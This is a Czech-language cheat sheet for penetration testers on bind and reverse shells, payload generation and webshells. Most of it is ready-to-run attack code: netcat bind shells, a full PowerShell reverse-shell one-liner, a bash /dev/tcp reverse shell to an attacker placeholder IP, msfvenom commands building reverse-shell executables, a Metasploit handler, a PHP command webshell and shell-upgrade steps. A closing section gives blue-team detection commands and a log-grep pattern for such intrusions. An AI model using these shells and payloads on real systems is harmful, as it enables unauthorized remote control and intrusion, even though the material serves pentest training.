# 🐚 Shell Basics & Payload Management

## 1. Směr komunikace: Bind vs. Reverse Shell

Pochopení rozdílu mezi **Bind Shellem** a **Reverse Shellem** je zásadní při práci s firewally a získávání vzdáleného přístupu.

---

## Bind Shell (Oběť naslouchá)

Útočník se připojuje k oběti.

Nevýhoda:
- Příchozí spojení na oběť bývá často blokováno firewallem.
- Útočník musí mít možnost připojit se na otevřený port oběti.

### Příklad:

**Oběť (Linux):**

```bash
nc -lvnp 4444 -e /bin/bash
```

**Útočník:**

```bash
nc <IP_OBĚTI> 4444
```

---

## Reverse Shell (Útočník naslouchá) ⭐ Doporučeno

Oběť vytvoří spojení směrem k útočníkovi.

Výhody:
- Odchozí provoz (egress) bývá často povolen.
- Snadnější průchod přes firewally.
- Nejčastější metoda při pentestingu.

### Útočník (Linux)

```bash
nc -lvnp 4444
```

---

### Oběť (Windows PowerShell)

```powershell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<IP_UTOCNIKA>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName Text.ASCIIEncoding).GetString($b,0,$i);$st=(iex $d 2>&1 | Out-String );$t=$st + 'PS ' + (pwd).Path + '> ';$x=([text.encoding]::ASCII).GetBytes($t);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()"
```

---

### Oběť (Linux Bash)

```bash
bash -i >& /dev/tcp/<IP_UTOCNIKA>/4444 0>&1
```

---

# 2. Tvorba a správa Payloadů

## msfvenom (Generování payloadů)

`msfvenom` slouží k vytváření spustitelných payloadů pro různé platformy.

---

## Windows Payload (.exe)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe > shell.exe
```

---

## Linux Payload (.elf)

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf > shell.elf
```

---

## PHP Reverse Shell

```bash
msfvenom -p php/reverse_php LHOST=<IP> LPORT=4444 -f raw > shell.php
```

---

# Metasploit - Příjem spojení

Pro pokročilé shelly (například Meterpreter) použij:

```bash
msfconsole
```

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <Tvoje_IP>
set LPORT 4444
run
```

---

# 3. Web Shelly: Prvotní přístup

Pokud získáš možnost:

- nahrát soubor (File Upload)
- ovlivnit soubor přes LFI
- spustit kód na web serveru

můžeš využít webshell.

---

## PHP Webshell

```php
<?php system($_GET['cmd']); ?>
```

Použití:

```
http://target.com/uploads/shell.php?cmd=id
```

Příklad příkazů:

```bash
id
whoami
pwd
```

---

## ASPX Webshell (Windows/IIS)

Umístění v Kali Linux:

```
/usr/share/webshells/aspx/
```

Například:

```
CommandShell.aspx
```

---

# 4. Identifikace a detekce (Forensics / Blue Team)

Profesionální tester musí chápat nejen útok, ale také detekci a stopy, které po sobě útok zanechá.

---

# Síťová aktivita

Hledej:

- podezřelá spojení
- neznámé IP adresy
- procesy vlastnící síťové sockety

---

## Windows

```powershell
netstat -ano | findstr ESTABLISHED
```

Kontroluj:
- neznámé PID
- podezřelé procesy

---

## Linux

```bash
ss -antp
```

nebo:

```bash
netstat -tunpa
```

---

# Podezřelé procesy

Webový server by normálně neměl spouštět interaktivní shell.

---

## Linux kontrola procesů

```bash
ps faux
```

Podezřelý příklad:

```
www-data
 └── apache2
      └── sh
```

nebo:

```
www-data
 └── python
      └── bash
```

---

## Windows kontrola procesů

```powershell
tasklist
```

Nebo použij:

- Process Explorer
- Sysinternals Suite

Podezřelý příklad:

```
w3wp.exe
 └── cmd.exe
```

nebo:

```
w3wp.exe
 └── powershell.exe
```

---

# Analýza logů

Hledej známky Remote Code Execution (RCE).

---

## Apache Access Logs

```bash
grep -E "whoami|id|cat|/etc/passwd|cmd.exe" /var/log/apache2/access.log
```

Podezřelé příkazy:

```
whoami
id
cat /etc/passwd
cmd.exe
powershell
```

---

# 🛠️ Shell Upgrade

Netcat shell je často omezený:

- nefungují šipky
- nefunguje TAB doplňování
- špatné ovládání terminálu

Řešení: upgrade na plnohodnotný TTY shell.

---

## 1. Spawn Python TTY

Na oběti:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 2. Pozastavení shellu

Stiskni:

```
CTRL + Z
```

---

## 3. Úprava terminálu na útočníkovi

```bash
stty raw -echo
fg
```

---

## 4. Nastavení TERM

Po návratu do shellu:

```bash
export TERM=xterm
```

---

# Shrnutí

| Typ | Směr spojení | Použití |
|---|---|---|
| Bind Shell | Útočník → Oběť | Méně časté, často blokované |
| Reverse Shell | Oběť → Útočník | Nejčastější metoda |
| Webshell | HTTP → Server | Prvotní přístup |
| Meterpreter | Metasploit → Oběť | Pokročilá post-exploitation |
